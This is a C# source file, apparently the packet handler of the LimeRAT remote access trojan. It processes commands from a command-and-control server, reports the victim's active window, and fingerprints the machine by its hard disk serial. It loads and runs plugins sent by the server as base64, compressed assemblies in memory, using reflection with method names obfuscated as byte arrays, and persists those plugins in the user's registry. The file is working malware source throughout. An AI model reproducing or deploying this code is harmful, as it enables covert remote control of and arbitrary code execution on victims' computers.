using Lime.Connection;
using Lime.Helper;
using Lime.Settings;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Text;
using System.Windows.Forms;

namespace Lime.Packets
{
    public class PacketHandler
    {
        public void Handler(byte[] packet)  //Receive Data from Server
        {
            try
            {
                string KEY = Config.key;
                string[] data = Strings.Split(StringConverter.BytestoString(packet), KEY, -1, CompareMethod.Text);
                if (data[0] == "PNC")
                {
                    Config.stopwatch.Reset();
                    Config.stopwatch.Start();
                    Client.TcpSend("PNC");
                }
                else if (data[0] == "P")
                {
                    Config.stopwatch.Stop();
                    Client.TcpSend("P" + KEY + Config.stopwatch.ElapsedMilliseconds);
                    Client.TcpSend("W" + KEY + IdGenerator.GetActiveWindow());
                }
                else if (data[0] == "IE") //Ask about plugin
                {
                    if ((Registry.CurrentUser.OpenSubKey("Software\\" + StringConverter.Encode(Config.currentMutex) + "\\" + data[1], true) != null))
                    {
                        try
                        {
                            Invoke(Config.host, Config.port, data[4], data[5], StringConverter.Encode(StringConverter.Decode(Config.id) + "_" + IdGenerator.GetHardDiskSerialNumber()), Registry.GetValue(@"HKEY_CURRENT_USER\SOFTWARE\" + StringConverter.Encode(Config.currentMutex) + @"\\" + data[1], data[1], null).ToString(), int.Parse(data[2]), Convert.ToBoolean(data[3]), data[1], true);
                        }
                        catch
                        {
                            Client.TcpSend("GPL" + KEY + data[5] + KEY + data[1] + KEY + "false");
                        }
                    }
                    else
                    {
                        Client.TcpSend("GPL" + KEY + data[5] + KEY + data[1] + KEY + "false");
                    }
                }
                else if (data[0] == "LP") //invoke plugin
                {
                    Invoke(Config.host, Config.port, data[1], data[2], StringConverter.Encode(StringConverter.Decode(Config.id) + "_" + IdGenerator.GetHardDiskSerialNumber()), data[3], int.Parse(data[4]), Convert.ToBoolean(data[5]), data[6], Convert.ToBoolean(data[7]));
                }
                else if (data[0] == "UNV") //uninstall - restart - close .. etc
                {
                    object ar = Interaction.CallByName(GetAssembly(data[1]), Encoding.Default.GetString(new byte[] { 71, 101, 116, 84, 121, 112, 101 }), CallType.Method, data[2]);
                    object enn = Interaction.CallByName(ar, Encoding.Default.GetString(new byte[] { 71, 101, 116, 77, 101, 116, 104, 111, 100 }), CallType.Method, Encoding.Default.GetString(new byte[] { 85, 78, 73 }));
                    object inn = Interaction.CallByName(enn, Encoding.Default.GetString(new byte[] { 73, 110, 118, 111, 107, 101 }), CallType.Method, null, new object[] { StringConverter.Encode(Config.currentMutex), data[3], null, null, null, null, null, null, null, null,
            null, null, null, null, null, null, null, null, null, null,
            null, null, null, null, null, null, null, null, null, null,
            null, null, data[4], data[5], Application.ExecutablePath, data[6], data[7], data[8], data[9], data[10],
            data[11], data[12], data[13]});
                }
            }
            catch
            {
                //Client.isConnected = false;
            }
        }

        public void Invoke(string H, string P, string N, string C, string ID, string Bytes, int S, bool M, string MD5, bool B) //invoke plugin function
        {
            try
            {
                byte[] ci = new byte[] { 67, 114, 101, 97, 116, 101, 73, 110, 115, 116, 97, 110, 99, 101 };
                byte[] gem = new byte[] { 71, 101, 116, 77, 101, 116, 104, 111, 100 };
                byte[] invo = new byte[] { 73, 110, 118, 111, 107, 101 };
                byte[] vod = new byte[] { 83, 116, 97, 114, 116 };
                object ar = Interaction.CallByName(GetAssembly(Bytes), Encoding.Default.GetString(ci), CallType.Method, N + "." + C);
                object inn = Interaction.CallByName(ar, Encoding.Default.GetString(vod), CallType.Method, new object[] { ID, S, H, P, Config.key, Config.splitter });
                if (M)
                {
                    try
                    {
                        if (Registry.CurrentUser.OpenSubKey("Software\\" + StringConverter.Encode(Config.currentMutex) + "\\" + MD5, true) == null)
                        {
                            SavePlugin("HKEY_CURRENT_USER\\SOFTWARE\\" + StringConverter.Encode(Config.currentMutex) + "\\" + MD5, MD5, Bytes);
                        }
                    }
                    catch
                    {
                    }
                    if (B == false)
                    {
                        SavePlugin("HKEY_CURRENT_USER\\SOFTWARE\\" + StringConverter.Encode(Config.currentMutex) + "\\" + MD5, MD5, Bytes);
                    }
                }
            }
            catch { }
        }
        public object GetAssembly(string bytesArray) //load assembly
        {
            try
            {

                byte[] lod = new byte[] { 76, 111, 97, 100 };
                object ap = AppDomain.CurrentDomain;
                return Interaction.CallByName(ap, Encoding.Default.GetString(lod), CallType.Method, StringConverter.Decompress(Convert.FromBase64String(bytesArray)));

            }
            catch { }
            return null;
        }

        public void SavePlugin(string P, string N, string B) //add reg value
        {
            try
            {
                Registry.SetValue(P, N, B);
            }
            catch { }
        }
    }
}
